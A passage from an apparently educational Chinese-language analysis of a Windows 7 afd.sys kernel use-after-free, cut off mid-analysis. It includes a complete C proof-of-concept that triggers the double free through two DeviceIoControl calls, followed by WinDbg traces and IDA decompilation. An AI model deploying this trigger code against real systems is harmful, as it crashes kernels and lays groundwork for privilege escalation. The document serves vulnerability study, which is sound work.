#### 前言
这个漏洞算是Windows
Kernel很经典的一个洞了，且各个方面都不算复杂，而UAF在内存损坏漏洞中是很常见的一种，适合入门。这里详细记录一下调试过程和一些分析思路。
##### 环境
windows 7 x86 sp1
#### 漏洞成因
这个漏洞的本质是，进行异常处理时，在afd!AfdReturnTpInfo函数中，tpInfo对象的mdl成员在释放后没有置空，造成了一个悬挂指针，一旦对该指针进行二次释放，就会引起Crash。
接下来我们主要调试poc来分析漏洞触发的一些细节，poc如下
    #include
    #include
    #pragma comment(lib,"WS2_32.lib")
    int main()
    {
        DWORD targetSize = 0x310;
        DWORD virtualAddress = 0x13371337;
        DWORD mdlSize = (0x4000 * (targetSize - 0x30) / 8) - 0xFFF0 - (virtualAddress & 0xFFF);
        static DWORD inbuf1[100];
        memset(inbuf1, 0, sizeof(inbuf1));
        inbuf1[6] = virtualAddress;
        inbuf1[7] = mdlSize;
        inbuf1[10] = 1;
        static DWORD inbuf2[100];
        memset(inbuf2, 0, sizeof(inbuf2));
        inbuf2[0] = 1;
        inbuf2[1] = 0x0AAAAAAA;
        WSADATA WSAData;
        SOCKET s;
        SOCKADDR_IN sa;
        int ierr;
        WSAStartup(0x2, &WSAData);
        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        memset(&sa, 0, sizeof(sa));
        sa.sin_port = htons(135);
        sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
        sa.sin_family = AF_INET;
        ierr = connect(s, (const struct sockaddr*) & sa, sizeof(sa));
        static char outBuf[100];
        DWORD bytesRet;
        __debugbreak();
        DeviceIoControl((HANDLE)s, 0X1207F, (LPVOID)inbuf1, 0x30, outBuf, 0, &bytesRet, NULL);
        DeviceIoControl((HANDLE)s, 0X120C3, (LPVOID)inbuf2, 0x18, outBuf, 0, &bytesRet, NULL);
        return 0;
    }
windbg连接后运行poc，就会触发异常，先进行栈回溯
    kd> kb
     # ChildEBP RetAddr  Args to Child              
    00 9859554c 83efa083 00000003 395c7f7f 00000065 nt!RtlpBreakWithStatusInstruction
    01 9859559c 83efab81 00000003 85eb6000 000001ff nt!KiBugCheckDebugBreak+0x1c
    02 98595960 83f3cc6b 000000c2 00000007 00001097 nt!KeBugCheck2+0x68b
    03 985959d8 83ea7ec2 85eb6008 00000000 85eb5700 nt!ExFreePoolWithTag+0x1b1
    04 985959ec 8e673eb0 85eb6008 00000000 8e65689f nt!IoFreeMdl+0x70
    05 98595a08 8e6568ac 00000000 00000001 163d9eb0 afd!AfdReturnTpInfo+0xad
    06 98595a44 8e657bba 163d9e18 000120c3 8e657a8c afd!AfdTliGetTpInfo+0x89
    07 98595aec 8e65c2bc 85eb3038 863073e8 98595b14 afd!AfdTransmitPackets+0x12e
    08 98595afc 83e52593 863073e8 87409488 87409488 afd!AfdDispatchDeviceControl+0x3b
    09 98595b14 8404699f 85eb3038 87409488 87409564 nt!IofCallDriver+0x63
    0a 98595b34 84049b71 863073e8 85eb3038 00000000 nt!IopSynchronousServiceTail+0x1f8
    0b 98595bd0 840903f4 863073e8 87409488 00000000 nt!IopXxxControlFile+0x6aa
    0c 98595c04 83e591ea 0000005c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
这里我们可以看到一个很清晰的调用链，即
    AfdDispatchDeviceControl->AfdTransmitPackets->AfdTliGetTpInfo->AfdReturnTpInfo->IoFreeMdl
不过我们的poc中调用了两次DeviceIoControl，并发送了不同的控制码，那么可以推断，这里的调用链是第二次调用DeviceIoControl时的情况。要对目标进行比较完整的分析，则我们需要找到第一次调用DeviceControl时的情况，所以需要找到控制码为0x1207F时的一系列调用。
有一点驱动开发基础的同学应该知道，每个驱动对象都有许多分发函数，用于系统回调。其中根据控制码来进行相应操作的是IRP_MJ_DEVICE_CONTROL例程，我们可以通过windbg来查看afd.sys的该例程的对应符号。
    kd> !drvobj afd 2
    Driver object (86307718) is for:
     \Driver\AFD
    DriverEntry:   8e67f63d afd!GsDriverEntry
    DriverStartIo: 00000000 
    DriverUnload:  8e6545b6 afd!AfdUnload
    AddDevice:     00000000 
    Dispatch routines:
    [00] IRP_MJ_CREATE                      8e65e190    afd!AfdDispatch
    [01] IRP_MJ_CREATE_NAMED_PIPE           8e65e190    afd!AfdDispatch
    [02] IRP_MJ_CLOSE                       8e65e190    afd!AfdDispatch
    [03] IRP_MJ_READ                        8e65e190    afd!AfdDispatch
    [04] IRP_MJ_WRITE                       8e65e190    afd!AfdDispatch
    [05] IRP_MJ_QUERY_INFORMATION           8e65e190    afd!AfdDispatch
    [06] IRP_MJ_SET_INFORMATION             8e65e190    afd!AfdDispatch
    [07] IRP_MJ_QUERY_EA                    8e65e190    afd!AfdDispatch
    [08] IRP_MJ_SET_EA                      8e65e190    afd!AfdDispatch
    [09] IRP_MJ_FLUSH_BUFFERS               8e65e190    afd!AfdDispatch
    [0a] IRP_MJ_QUERY_VOLUME_INFORMATION    8e65e190    afd!AfdDispatch
    [0b] IRP_MJ_SET_VOLUME_INFORMATION      8e65e190    afd!AfdDispatch
    [0c] IRP_MJ_DIRECTORY_CONTROL           8e65e190    afd!AfdDispatch
    [0d] IRP_MJ_FILE_SYSTEM_CONTROL         8e65e190    afd!AfdDispatch
    [0e] IRP_MJ_DEVICE_CONTROL              8e65c281    afd!AfdDispatchDeviceControl
    ······
可以看到该例程正是afd!AfdDispatchDeviceControl，用IDA反编译一下该函数
    int __stdcall AfdDispatchDeviceControl(int a1, PIRP Irp)
    {
      _IO_STACK_LOCATION *v2; // edx
      unsigned int v3; // eax
      int (*v4)(void); // esi
      v2 = Irp->Tail.Overlay.CurrentStackLocation;
      v3 = (v2->Parameters.Read.ByteOffset.LowPart >> 2) & 0x3FF;
      if ( v3 Parameters.Others.Argument3 )
      {
        v2->MinorFunction = v2->Parameters.Read.ByteOffset.LowPart >> 2;
        v4 = (int (*)(void))AfdIrpCallDispatch[v3];
        if ( v4 )
          return v4(); //根据控制码决定要运行的函数
      }
      Irp->IoStatus.Status = 0xC0000010;
      IofCompleteRequest(Irp, AfdPriorityBoost);
      return 0xC0000010;
    }
所以我们可以通过调试找到控制码为0x1207F对应的函数。首先在这里下断点，然后运行poc，接着到调用处
    kd> bp afd!AfdDispatchDeviceControl
    kd> g
    Breakpoint 0 hit
    afd!AfdDispatchDeviceControl:
    0008:8e65c281 8bff            mov     edi,edi
    ······
    kd> p
    afd!AfdDispatchDeviceControl+0x39:
    0008:8e65c2ba ffd6            call    esi
    kd> t
    afd!AfdTransmitFile:
    0008:8e65731e 6884000000      push    84h
可以看到进入了AfdTransmitFile函数，我们用IDA来分析它。这里需要说的一点是，这个函数使用了许多异常处理操作，用IDA进行反编译的效果不如直接看汇编。前面都是一些和输入的比对，步过就行。接下来我们的poc会走下图左边的分支，关键的函数是AfdTliGetTpInfo，该函数在第二次调用DeviceIoControl的调用链中也出现了  
AfdTliGetTpInfo的功能主要是返回一个tpInfo对象并对其初始化，其中会调用ExAllocateFromNPagedLookasideList函数来分配空间，其内部如下
在调试的过程中可以发现，这里的分支会走中间的基本块，
    kd> p
    afd!ExAllocateFromNPagedLookasideList+0xe:
    0008:8e63c5ac ff1588a2648e    call    dword ptr [afd!_imp_InterlockedPopEntrySList (8e64a288)]
    kd> p
    afd!ExAllocateFromNPagedLookasideList+0x14:
    0008:8e63c5b2 85c0            test    eax,eax
    kd> r
    eax=00000000 ebx=944071f0 ecx=00000000 edx=00000000 esi=86307238 edi=00000003